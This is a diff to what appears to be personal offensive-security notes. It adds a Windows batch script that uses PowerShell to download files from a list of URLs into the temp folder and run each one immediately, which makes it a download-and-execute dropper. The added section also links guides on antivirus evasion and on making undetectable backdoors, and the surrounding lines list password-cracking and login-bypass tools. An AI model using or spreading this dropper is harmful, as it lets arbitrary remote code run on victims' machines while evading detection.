@@ -26,3 +26,24 @@ sending data to remote server accessing data which it is not intended to have.
 ### POST ABOVE
 - Kon boot
 - oph crack
+
+#### Windows file downloader scripts:
+### Bat scripts:
+```
+@echo off
+
+set files='url1','url2','url3'
+
+powershell "(%files%)|foreach{$fileName='%TEMP%'+(Split-Path -Path $_ -Leaf);(new-object System.Net.WebClient).DownloadFile($_,$fileName);Invoke-Item $fileName;}"
+```
+
+## References:
+[Anti-virus evastion - Mimikatz by _ippsec_](https://www.youtube.com/watch?v=9pwMCHlNma4&t=1118s)<br>
+[Create FUD backdoors by _zSecurity_](https://www.youtube.com/watch?v=cgM-_42rWbM)
+
+
+
+
+
+
+
